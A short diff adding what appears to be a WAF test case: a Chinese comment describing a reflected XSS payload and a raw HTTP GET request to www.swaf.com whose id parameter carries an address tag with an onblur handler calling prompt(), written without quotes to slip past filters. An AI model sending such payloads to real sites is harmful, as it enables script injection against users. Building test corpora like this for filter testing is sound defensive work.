@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_address标签_onblur事件-06506566
+# 攻击载荷利用了HTML中的address标签和onblur属性，触发prompt()函数，显示一个提示框。当元素失去焦点时触发，未使用单引号和双引号绕过测试
+GET /?id=%3Caddress%20onblur=prompt%28%2Fxss%2F%29%20tabindex=1%20id=x%3E%3C%2Faddress%3E%3Cinput%20autofocus%3E&bid=hd_tag_m8mv2698 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2698
+RM-PRO-Token: 8c9e5292f500c684683dcd72a4c98c66
+RM-PRO-Time: 1742808559308
+User-Agent: curl/7.83.1
+
